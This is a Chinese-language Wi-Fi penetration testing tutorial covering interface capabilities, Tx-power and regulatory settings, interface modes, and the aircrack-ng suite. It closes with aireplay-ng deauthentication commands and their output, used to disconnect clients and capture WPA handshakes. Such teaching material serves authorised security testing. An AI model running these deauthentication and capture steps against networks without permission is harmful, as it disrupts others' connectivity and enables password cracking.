
## Wi-Fi 接口

毕竟，我们的机器通过这些接口传输和接收数据。如果没有它们，我们就无法进行通信。选择合适的接口时，必须考虑许多不同的方面。如果选择的接口性能太弱，在渗透测试过程中可能无法捕获数据。

如果我们的接口只支持 2.4G 而不支持 5G，那么在尝试扫描高频段网络时可能会遇到问题。这当然是显而易见的，但我们应该在接口中寻找以下特性：

- 支持 IEEE 802.11ac 或 IEEE 802.11ax
- 至少支持监听模式和数据包注入

### 接口强度

Wi-Fi 渗透测试的许多方面都取决于我们的物理位置。因此，如果网卡太弱，我们可能会发现效果并不好。为此，我们可能希望选择长距离网卡。我们可以通过 iwconfig 工具来检查这一点。

```bash
iwconfig
wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

默认情况下，这被设置为操作系统中指定的国家。我们可以通过 Linux 中的 `iw reg get` 命令来检查这一点。

```bash
iw reg get
global
country 00: DFS-UNSET
        (2402 - 2472 @ 40), (6, 20), (N/A)
        (2457 - 2482 @ 20), (6, 20), (N/A), AUTO-BW, PASSIVE-SCAN
        (2474 - 2494 @ 20), (6, 20), (N/A), NO-OFDM, PASSIVE-SCAN
        (5170 - 5250 @ 80), (6, 20), (N/A), AUTO-BW, PASSIVE-SCAN
        (5250 - 5330 @ 80), (6, 20), (0 ms), DFS, AUTO-BW, PASSIVE-SCAN
        (5490 - 5730 @ 160), (6, 20), (0 ms), DFS, PASSIVE-SCAN
        (5735 - 5835 @ 80), (6, 20), (N/A), PASSIVE-SCAN
        (57240 - 63720 @ 2160), (N/A, 0), (N/A)
```

通过这个，我们可以看到我们区域可以使用的所有不同的 Tx-Power 设置。大多数情况下，这可能是 `DFS-UNSET`，它将我们的网卡限制在 20 dBm。我们当然可以将其更改为我们自己的区域。

使用 iw reg set 命令来实现，只需将 US 更改为我们区域的两个字母代码。

```bash
sudo iw reg set US
```

使用 `iw reg get` 命令再次检查此设置。

```bash
iw reg get
global
country US: DFS-FCC
        (902 - 904 @ 2), (N/A, 30), (N/A)
        (904 - 920 @ 16), (N/A, 30), (N/A)
        (920 - 928 @ 8), (N/A, 30), (N/A)
        (2400 - 2472 @ 40), (N/A, 30), (N/A)
        (5150 - 5250 @ 80), (N/A, 23), (N/A), AUTO-BW
        (5250 - 5350 @ 80), (N/A, 24), (0 ms), DFS, AUTO-BW
        (5470 - 5730 @ 160), (N/A, 24), (0 ms), DFS
        (5730 - 5850 @ 80), (N/A, 30), (N/A), AUTO-BW
        (5850 - 5895 @ 40), (N/A, 27), (N/A), NO-OUTDOOR, AUTO-BW, PASSIVE-SCAN
        (5925 - 7125 @ 320), (N/A, 12), (N/A), NO-OUTDOOR, PASSIVE-SCAN
        (57240 - 71000 @ 2160), (N/A, 40), (N/A)
```

之后，我们可以使用 `iwconfig` 工具检查我们接口的 Tx-Power。

```
iwconfig
wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

在许多情况下，我们的接口会自动将其功率设置为我们区域的最大值。然而，有时我们可能需要自己手动设置。首先，我们需要关闭我们的接口。

```bash
sudo ifconfig wlan0 down
```

使用 `iwconfig` 工具为我们的接口设置所需的 Tx-Power。

```bash
sudo iwconfig wlan0 txpower 30
```

重新启用我们的接口。

```
sudo ifconfig wlan0 up
```

再次使用 `iwconfig` 工具检查设置。

```bash
iwconfig
wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

无线接口的默认 TX 功率通常设置为 20 dBm，但可以使用某些方法将其增加到 30 dBm。某些无线型号可能不支持这些设置。可以用上面的命令修改无线接口的 TX 功率。然而有时候更改可能不会生效，这可能表明内核已被修补以防止此类修改。

对于我们的接口而言，其在 Wi-Fi 渗透测试中执行操作的能力是最重要的事情之一。如果我们的接口不支持某个功能，在大多数情况下，我们根本无法执行操作，除非我们获取另一个接口。幸运的是，我们可以通过命令行检查这些功能。

使用 `iw list` 命令。

```bash
iw list
Wiphy phy5
	wiphy index: 5
	max # scan SSIDs: 4
	max scan IEs length: 2186 bytes
	max # sched scan SSIDs: 0
	max # match sets: 0
	max # scan plans: 1
	max scan plan interval: -1
	max scan plan iterations: 0
	Retry short limit: 7
	Retry long limit: 4
	Coverage class: 0 (up to 0m)
	Device supports RSN-IBSS.
	Device supports AP-side u-APSD.
	Device supports T-DLS.
	Supported Ciphers:
			* WEP40 (00-0f-ac:1)
			* WEP104 (00-0f-ac:5)
			<SNIP>
			* GMAC-256 (00-0f-ac:12)
	Available Antennas: TX 0 RX 0
	Supported interface modes:
			 * IBSS
			 * managed
			 * AP
			 * AP/VLAN
			 * monitor
			 * mesh point
			 * P2P-client
			 * P2P-GO
			 * P2P-device
	Band 1:
		<SNIP>
		Frequencies:
				* 2412 MHz [1] (20.0 dBm)
				* 2417 MHz [2] (20.0 dBm)
				<SNIP>
				* 2472 MHz [13] (disabled)
				* 2484 MHz [14] (disabled)
	Band 2:
		<SNIP>
		Frequencies:
				* 5180 MHz [36] (20.0 dBm)
				<SNIP>
				* 5260 MHz [52] (20.0 dBm) (radar detection)
				<SNIP>
				* 5700 MHz [140] (20.0 dBm) (radar detection)
				<SNIP>
				* 5825 MHz [165] (20.0 dBm)
				* 5845 MHz [169] (disabled)
	<SNIP>
		Device supports TX status socket option.
		Device supports HT-IBSS.
		Device supports SAE with AUTHENTICATE command
		Device supports low priority scan.
	<SNIP>
```

当然，此输出可能很长，但其中的所有信息都与我们的测试工作相关。从上面的示例中，我们知道此接口支持以下内容：

- 几乎所有相关的常规加密算法
- 2.4GHz 和 5GHz 频段
- Mesh 网络和 IBSS 功能
- P2P 对等连接
- SAE，即 WPA3 认证

因此，检查我们接口的功能非常重要。假设我们正在测试一个 WPA3 网络，结果发现我们接口的驱动程序不支持 WPA3，我们可能会感到一头雾水。

### 扫描可用的 Wi-Fi 网络

为了扫描可用的 Wi-Fi 网络，我们可以使用 iwlist 命令以及特定的接口名称。考虑到此命令的输出可能很长，过滤结果应该仅显示最相关的信息。这可以通过将输出通过 grep 管道传递，仅包含包含 Cell、Quality、ESSID 或 IEEE 的行。

```
iwlist wlan0 scan |  grep 'Cell\|Quality\|ESSID\|IEEE'
          Cell 01 - Address: f0:28:c8:d9:9c:6e
                    Quality=61/70  Signal level=-49 dBm
                    ESSID:"WIFI-Wireless"
                    IE: IEEE 802.11i/WPA2 Version 1
          Cell 02 - Address: 3a:c4:6e:40:09:76
                    Quality=70/70  Signal level=-30 dBm
                    ESSID:"CyberCorp"
                    IE: IEEE 802.11i/WPA2 Version 1
          Cell 03 - Address: 48:32:c7:a0:aa:6d
                    Quality=70/70  Signal level=-30 dBm
                    ESSID:"HackTheBox"
                    IE: IEEE 802.11i/WPA2 Version 1
```

从 `iwlist` 命令的精简输出中，我们可以识别出有三个可用的 Wi-Fi 网络。此过滤后的信息侧重于关键细节，例如网络单元、信号质量、ESSID 和 IEEE 规范。

### 更改接口的信道和频率

使用以下命令查看无线接口的所有可用信道：

```bash
iwlist wlan0 channel
wlan0     共有 32 个信道；可用频率：
          Channel 01 : 2.412 GHz
          Channel 02 : 2.417 GHz
          Channel 03 : 2.422 GHz
          Channel 04 : 2.427 GHz
          <SNIP>
          Channel 140 : 5.7 GHz
          Channel 149 : 5.745 GHz
          Channel 153 : 5.765 GHz
```

首先，我们需要禁用无线接口。然后我们可以使用 `iwconfig` 命令设置所需的信道，最后重新启用无线接口。

```bash
sudo ifconfig wlan0 down
sudo iwconfig wlan0 channel 64
sudo ifconfig wlan0 up
```

```bash
iwlist wlan0 channel
wlan0     共有 32 个信道；可用频率：
          Channel 01 : 2.412 GHz
          Channel 02 : 2.417 GHz
          Channel 03 : 2.422 GHz
          Channel 04 : 2.427 GHz
          <SNIP>
          Channel 140 : 5.7 GHz
          Channel 149 : 5.745 GHz
          Channel 153 : 5.765 GHz
          Current Frequency:5.32 GHz (Channel 64)
```

如上述输出所示，信道 64 在 5.32 GHz 的频率下运行。通过这些操作，可以更改无线接口的信道，以优化性能并减少干扰。

如果更喜欢直接更改频率而不是调整信道，我们也可以这样：

```bash
iwlist wlan0 frequency | grep Current
          Current Frequency:5.32 GHz (Channel 64)
```

要更改频率，命令如下：
```bash
sudo ifconfig wlan0 down
sudo iwconfig wlan0 freq "5.52G"
sudo ifconfig wlan0 up
```

现在我们可以验证当前的频率，这次我们可以看到频率已成功更改为 5.52 GHz。此更改自动将信道调整到相应的信道 104。

```
iwlist wlan0 frequency | grep Current
          Current Frequency:5.52 GHz (Channel 104)
```


## 接口模式

在 Wi-Fi 通信的层级结构中，每种模式都负责不同的能力和角色。

### 管理模式 (Managed Mode)

接口在需要充当客户端或站点时，使用管理模式。换句话说，此模式允许设备认证并关联到接入点、基本服务集（BSS）等。在此模式下，网卡会主动搜索附近的网络（AP），以便建立连接。

在大多数情况下，接口默认都处于此模式。将接口设置为此模式，在将其设置为监听模式后会很有帮助。使用以下命令进行设置。

Bash

```
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode managed
```

连接到网络，使用以下命令。

```
sudo iwconfig wlan0 essid MYWIFI
```

检查接口设置，使用 `iwconfig` 工具。

```
sudo iwconfig
wlan0     IEEE 802.11  ESSID:"MYWIFI"
          Mode:Managed  Access Point: Not-Associated   Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

### 自组模式 (Ad-hoc Mode)

其次，接口可采用去中心化的方法。这就是自组模式发挥作用的地方。本质上，这种模式是点对点的，允许无线接口直接相互通信。这种模式常见于大多数住宅网状系统（mesh systems）的回程频段。回程频段是用于 AP 之间通信和扩展覆盖范围的频段。然而，需要注意的是，这种模式不是扩展器模式，因为在大多数情况下，扩展器模式实际上是将两个接口桥接在一起。

将接口设置为此模式，运行以下命令。

Bash

```
sudo iwconfig wlan0 mode ad-hoc
sudo iwconfig wlan0 essid MYWIFI
```

然后，再次使用 `iwconfig` 命令检查接口设置。

```
sudo iwconfig
wlan0     IEEE 802.11  ESSID:"WIFI-Mesh"
          Mode:Ad-Hoc  Frequency:2.412 GHz  Cell: Not-Associated
          Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

### 主模式 (Master Mode)

与管理模式相反的是主模式（接入点/路由器模式）。无法直接使用 iwconfig 工具设置此模式。需要一个被称为管理守护进程（management daemon）的程序。此管理守护进程负责响应连接到网络的站点或客户端。通常，在 Wi-Fi 渗透测试中，可使用 hostapd 完成此任务。首先需要创建一个示例配置。

```
nano open.conf
```

在打开的文件中输入以下内容：

```
interface=wlan0
driver=nl80811
ssid=Hello-World
channel=2
hw_mode=g
```

这个配置将简单地启动一个名为 Hello-World 的开放网络。通过此网络配置，可使用以下命令将其启动。

```
sudo hostapd open.conf
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
wlan0: STA 2c:6d:c1:af:eb:91 IEEE 802.11: authenticated
wlan0: STA 2c:6d:c1:af:eb:91 IEEE 802.11: associated (aid 1)
wlan0: AP-STA-CONNECTED 2c:6d:c1:af:eb:91
wlan0: STA 2c:6d:c1:af:eb:91 RADIUS: starting accounting session D249D3336F052567
```

在上面的示例中，hostapd 启动 AP，然后连接另一设备至网络，应注意到连接消息。这将表明主模式成功运行。

### Mesh 模式 (Mesh Mode)

Mesh 模式是一种将接口设置为加入自配置和自路由网络的方式。这种模式常用于需要在大物理空间内实现大范围覆盖的商业应用。此模式将接口变成一个 mesh 点。可提供额外配置使其正常工作，但通常可通过运行以下命令后是否出现错误来判断是否可行。

```
sudo iw dev wlan0 set type mesh
```

然后，再次使用 `iwconfig` 工具检查接口设置。

```
sudo iwconfig
wlan0     IEEE 802.11  Mode:Auto  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

### 监听模式 (Monitor Mode)

监听模式，是无线网络接口的一种专用操作模式。在此模式下，网络接口可以捕获其范围内的所有无线流量，无论目标是谁。与接口仅捕获指向自身或广播的数据包的正常操作不同，监听模式可以实现全面的网络监控和分析。

启用监听模式通常需要管理员权限，并且可能因操作系统和使用的无线芯片组而异。启用后，监听模式提供了强大的工具来管理无线网络。

首先需要关闭接口，以避免设备或资源繁忙错误。

```
sudo ifconfig wlan0 down
```

然后，使用 `iw {接口名称} set {模式}` 设置接口模式。

```
sudo iw wlan0 set monitor control
```

然后重新启用接口。

```
sudo ifconfig wlan0 up
```

最后，为确保接口处于监听模式，可使用 `iwconfig` 工具。

```
iwconfig
wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

总而言之，确保接口支持与测试工作相关的模式非常重要。若尝试利用 WEP、WPA、WPA2、WPA3 以及所有企业变体，通常仅需监听模式和数据包注入功能即可。然而，若尝试实现其他的操作，可能需要考虑以下功能。

实施伪造 AP 或邪恶双子攻击 (Rogue AP or Evil-Twin Attack)：- 接口应支持主模式并结合 hostapd, hostapd-mana, hostapd-wpe, airbase-ng 等管理守护进程。

回程和 Mesh 或 Mesh 类型系统利用 (Backhaul and Mesh or Mesh-Type system exploitation)：- 应确保接口支持自组模式和 Mesh 模式。对于此类利用，通常仅需监听模式和数据包注入即可，但额外功能可支持执行节点模拟等操作。


## Aircrack-ng

Aircrack-ng 的功能有：

- **监控 (Monitoring)**：数据包捕获并将数据导出到文本文件，供第三方工具进一步处理。
- **攻击 (Attacking)**：通过数据包注入进行重放攻击、解除认证、伪造接入点等。
- **测试 (Testing)**：检查 Wi-Fi 网卡和驱动程序的功能（捕获和注入）。
- **破解 (Cracking)**：WEP 和 WPA PSK (WPA 1 和 2)。

|   **工具**    |                       **描述**                        |
| :---------: | :-------------------------------------------------: |
|  Airmon-ng  |             Airmon-ng 可以启用和禁用无线接口的监听模式。             |
| Airodump-ng |            Airodump-ng 可以捕获原始的 802.11 帧。            |
| Airgraph-ng |  Airgraph-ng 可以使用 Airodump-ng 生成的 CSV 文件创建无线网络图表。   |
| Aireplay-ng |                Aireplay-ng 可以生成无线流量。                |
| Airdecap-ng |    Airdecap-ng 可以解密 WEP、WPA PSK 或 WPA2 PSK 捕获文件。    |
| Aircrack-ng | Aircrack-ng 可以破解使用预共享密钥或 PMKID 的 WEP 和 WPA/WPA2 网络。 |

### Airmon-ng

监听模式是无线网络接口的一种专用模式，使其能够捕获 Wi-Fi 范围内的所有流量。与管理模式下接口只处理指向自己的帧不同，监听模式允许接口捕获检测到的每一个数据包，无论其预期接收者是谁。

#### 启动监听模式

Airmon-ng 可用于启用无线接口的监听模式。它也可以用于终止网络管理器进程，或从监听模式切换回管理模式。不带参数运行 `airmon-ng` 命令将显示无线接口名称、驱动程序和芯片组。

```bash
sudo airmon-ng
PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
```

可以使用命令 `airmon-ng start wlan0` 将 `wlan0` 接口设置为监听模式。

```bash
sudo airmon-ng start wlan0
Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

可以使用 `iwconfig` 工具测试接口是否处于监听模式。

```
iwconfig
wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

从以上输出可以看出，接口已成功设置为监听模式。接口的新名称现在是 `wlan0mon` 而非 `wlan0`，表明它正在监听模式下运行。

#### 检查干扰进程

将网卡置于监听模式时，它会自动检查干扰进程。也可以通过运行以下命令手动检查：

```
sudo airmon-ng check
Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

  PID Name
  718 NetworkManager
  870 dhclient
 1104 avahi-daemon
 1105 avahi-daemon
 1115 wpa_supplicant
```

如以上输出所示，有 5 个干扰进程可能会通过更改信道或将接口切换回管理模式而导致问题。如果遇到问题，可以使用 `airmon-ng check kill` 命令终止这些进程。

然而，只有在遇到问题时才应执行此步骤。

```bash
sudo airmon-ng check kill
Killing these processes:

  PID Name
  870 dhclient
 1115 wpa_supplicant
```

#### 在特定信道上启动监听模式

也可以使用 `airmon-ng` 将无线网卡设置为特定信道。在启用 `wlan0` 接口的监听模式时，可以指定所需的信道。

```bash
sudo airmon-ng start wlan0 11
Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

  PID Name
  718 NetworkManager
  870 dhclient
 1104 avahi-daemon
 1105 avahi-daemon
 1115 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

以上命令将网卡设置为在信道 11 上运行监听模式。这确保了 `wlan0` 接口在监听模式下专门在信道 11 上操作。

#### 停止监听模式

可以使用命令 `airmon-ng stop wlan0mon` 停止 `wlan0mon` 接口上的监听模式。

```
sudo airmon-ng stop wlan0mon
PHY     Interface       Driver          Chipset

phy0    wlan0mon        rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 station mode vif enabled on [phy0]wlan0)
                (mac80211 monitor mode vif disabled for [phy0]wlan0)
```

可以使用 `iwconfig` 工具测试接口是否已返回管理模式。

```
iwconfig
wlan0  IEEE 802.11  Mode:Managed  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

### Airodump-ng

Airodump-ng 用作数据包捕获工具，专门针对原始 802.11 帧。

| **字段**  |              **描述**               |
| :-----: | :-------------------------------: |
|  BSSID  |          显示接入点的 MAC 地址。           |
|   PWR   |      显示网络的“功率”。数字越高，信号强度越好。       |
| Beacons |           显示网络发送的广播包数量。           |
|  Data   |            显示捕获的数据包数量。            |
|   /s    |         显示过去十秒内捕获的数据包数量。          |
|   CH    |           显示网络运行的“信道”。            |
|   MB    |           显示网络支持的最大速度。            |
|   ENC   |           显示网络使用的加密方法。            |
| CIPHER  |           显示网络使用的加密算法。            |
|  AUTH   |           显示网络使用的认证方法。            |
|  ESSID  |             显示网络的名称。              |
| STATION |       显示连接到网络的客户端的 MAC 地址。        |
|  RATE   |        显示客户端与接入点之间的数据传输速率。        |
|  LOST   |            显示丢失的数据包数量。            |
| Packets |          显示客户端发送的数据包数量。           |
|  Notes  | 显示有关客户端的附加信息，例如捕获的 EAPOL 或 PMKID。 |
| PROBES  |          显示客户端正在探测的网络列表。          |

为了利用 airodump-ng，第一步是在无线接口上激活监听模式。此模式允许接口捕获其附近的全部无线流量。可以使用 airmon-ng 在接口上启用监听模式，如前一节所示。

```bash
sudo airmon-ng start wlan0mon
Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

启动后，生成的表格下方显示的 stations 代表连接到 Wi-Fi 网络的客户端。

#### 扫描特定信道或单个信道

命令 `airodump-ng wlan0mon` 启动全面扫描，收集所有可用信道上的无线接入点数据。然而，可以使用 `-c` 选项指定特定信道，将扫描集中在某个频率上。例如，`-c 11` 将扫描范围缩小到信道 11。这种有针对性的方法可以提供更精确的结果，尤其是在拥挤的 Wi-Fi 环境中。

也可以使用命令 `airodump-ng -c 1,6,11 wlan0mon` 选择多个信道进行扫描。

#### 扫描 5 GHz Wi-Fi 频段

默认情况下，airodump-ng 配置为仅扫描在 2.4 GHz 频段上运行的网络。但是，如果无线适配器兼容 5 GHz 频段，可以使用 `--band` 选项。

|频段|频率|
|:--|:--|
|a|5 GHz|
|b|2.4 GHz|
|g|2.4 GHz|

```bash
sudo airodump-ng wlan0mon --band a
CH  48 ][ Elapsed: 1 min ][ 2024-05-18 17:41 ][
                                                                                                             BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 00:14:6C:7A:41:81   34 100       57       14    1  48  11e  WPA  TKIP        WIFI

BSSID              STATION            PWR   Rate   Lost  Frames  Notes  Probes

 (not associated)   00:0F:B5:32:31:31  -29    0      42        4
 (not associated)   00:14:A4:3F:8D:13  -29    0       0        4
 (not associated)   00:0C:41:52:D1:D1  -29    0       0        5
 (not associated)   00:0F:B5:FD:FB:C2  -29    0       0       22
```

使用 `--band` 选项时，可以根据扫描需求灵活指定单个频段或多个频段的组合。例如，要扫描所有可用频段，可以执行命令 `airodump-ng --band abg wlan0mon`。此命令指示 airodump-ng 同时扫描 a、b 和 g 频段上的网络。

#### 将输出保存到文件

可以通过使用 `--write <prefix>` 参数来保存 `airodump-ng` 扫描的结果。此操作将生成多个以指定前缀命名的文件。例如，执行 `airodump-ng wlan0mon --write MYWIFI` 将在当前目录中生成多个以`MYWIFI`开头的文件。

### Airgraph-ng

Airgraph-ng 是一个 Python 脚本，旨在利用 Airodump-ng 生成的 CSV 文件生成无线网络的图形化表示。Airodump-ng 生成的这些 CSV 文件捕获了关于无线客户端与接入点（AP）之间关联以及探测到的网络清单的关键数据。Airgraph-ng 处理这些 CSV 文件以生成两种不同类型的图表：

- 客户端与 AP 关系图 (Clients to AP Relationship Graph)：此图表描绘了无线客户端与接入点之间的连接，提供了对网络拓扑和设备之间交互的洞察。
- 客户端探测图 (Clients Probe Graph)：此图表展示了无线客户端探测到的网络，直观地描绘了这些设备扫描并可能尝试访问的网络。

通过利用 Airgraph-ng，用户可以可视化和分析无线网络内的关系和交互，有助于网络故障排除、优化和安全评估。

#### 客户端与 AP 关系图 (Clients to AP Relationship Graph)

客户端与 AP 关系（CAPR）图表描绘了客户端与接入点（AP）之间的连接。由于此图表强调客户端，它将不会显示任何没有连接客户端的 AP。

接入点根据其加密类型进行颜色编码：

- 绿色表示 WPA
- 黄色表示 WEP
- 红色表示开放网络
- 黑色表示未知加密

```bash
sudo airgraph-ng -i WIFI.csv -g CAPR -o WIFI_CAPR.png
**** WARNING Images can be large, up to 12 Feet by 12 Feet****
Creating your Graph using, WIFI.csv and writing to, WIFI_CAPR.png
Depending on your system this can take a bit. Please standby......
```
![[Pasted image 20250514013224.png]]

#### 客户端探测图 (Common Probe Graph)

Airgraph-ng 中的客户端探测图（CPG）可视化了无线客户端与其探测的接入点（AP）之间的关系。它通过显示客户端发出的探测，展示了每个客户端正在尝试连接哪些 AP。此图表有助于识别哪些客户端正在探测哪些网络，即使它们当前未连接到任何 AP。

```bash
sudo airgraph-ng -i WIFI.csv -g CPG -o WIFI_CPG.png
**** WARNING Images can be large, up to 12 Feet by 12 Feet****
Creating your Graph using, WIFI.csv and writing to, WIFI_CPG.png
Depending on your system this can take a bit. Please standby......
```

![[Pasted image 20250514013303.png]]

## Aireplay-ng

Aireplay-ng 的主要功能是生成流量，以便后续用于 aircrack-ng 破解 WEP 和 WPA-PSK 密钥。它包含多种攻击类型，可以用于解除认证以捕获 WPA 握手数据、伪造认证、交互式数据包重放、手工构造 ARP 请求注入和 ARP 请求重注入。使用 packetforge-ng 工具可以创建任意帧。


```bash
aireplay-ng
Attack modes (numbers can still be used):
...
      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)

      --help              : Displays this usage screen
```

| **攻击编号** |                     **攻击名称**                      |
| :------: | :-----------------------------------------------: |
| Attack 0 |             解除认证攻击 (Deauthentication)             |
| Attack 1 |           伪造认证攻击 (Fake authentication)            |
| Attack 2 |       交互式数据包重放 (Interactive packet replay)        |
| Attack 3 |      ARP 请求重放攻击 (ARP request replay attack)       |
| Attack 4 |                 KoreK chopchop 攻击                 |
| Attack 5 |            分段攻击 (Fragmentation attack)            |
| Attack 6 |                   Cafe-latte 攻击                   |
| Attack 7 | 面向客户端的分段攻击 (Client-oriented fragmentation attack) |
| Attack 8 |          WPA 迁移模式攻击 (WPA Migration Mode)          |
| Attack 9 |               注入测试 (Injection test)               |

可以看到，解除认证的标志是 `-0` 或 `--deauth`。此攻击可用于将客户端从接入点 (AP) 断开。通过使用 `aireplay-ng`，可以向 AP 发送解除认证数据包。AP 会误认为这些解除认证请求来自客户端本身，而实际上，是我们在发送它们。

#### 测试数据包注入

在发送解除认证帧之前，验证无线网卡是否能成功将帧注入目标接入点 (AP) 非常重要。可以通过测量从 AP 返回的 ping 响应时间来测试，这基于收到的响应百分比，可以了解链路质量。

启用监听模式并将接口的信道设置为 1。可以使用命令 `airmon-ng start wlan0 1` 来完成此操作。或者，可以使用 `iw` 命令设置信道，如下所示：


```bash
sudo iw dev wlan0mon set channel 1
```


```bash
sudo aireplay-ng --test wlan0mon
12:34:56  Trying broadcast probe requests...
12:34:56  Injection is working!
12:34:56  Found 27 APs
12:34:56  Trying directed probe requests...
12:34:56   00:09:5B:1C:AA:1D - channel: 1 - 'TOMMY'
12:34:56  Ping (min/avg/max): 0.457ms/1.813ms/2.406ms Power: -48.00
12:34:56  30/30: 100%
<SNIP>
```

如果一切正常，应看到消息 `Injection is working!` 这表明接口支持数据包注入，并且已准备好使用 `aireplay-ng` 执行解除认证攻击。

#### 使用 Aireplay-ng 执行解除认证

首先，使用` airodump-ng `查看可用的 Wi-Fi 网络，即接入点 (AP)。

```bash
sudo airodump-ng wlan0mon
CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][
                                                                                                             BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              Redmi
 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  WIFI_1
 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  TPLINK

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           WIFI_1
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           WIFI_1
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           TPLINK
```

从以上输出可以看到，有三个可用的 Wi-Fi 网络，并且有两个客户端连接到名为 WIFI 的网络。向其中一个站点 ID 为 00:0F:B5:32:31:31 的客户端发送解除认证请求。

```bash
sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
11:12:33  Waiting for beacon frame (BSSID: 00:14:6C:7A:41:81) on channel 1
11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:36  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
```

- `-0` 表示解除认证。
- `5` 是要发送的解除认证次数（可以发送多次）；`0` 表示连续发送。
- `-a 00:14:6C:7A:41:81` 是接入点的 MAC 地址。
- `-c 00:0F:B5:32:31:31` 是要解除认证的客户端的 MAC 地址；如果省略此项，则所有客户端都会被解除认证。
- `wlan0mon` 是接口名称。

客户端从 AP 解除认证后，可以继续观察 `airodump-ng`，看它们何时重新连接。

Bash

```
sudo airodump-ng wlan0mon
CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7A:41:81
                                                                                                             BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              Redmi
 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  WIFI_1
 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  TPLINK

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24   212     145   EAPOL  WIFI_1
 (not associated)   00:14:A4:3F:8D:13   19    0-0      0       4
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36     0       5          WIFI_1
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54     0       9          TPLINK
```
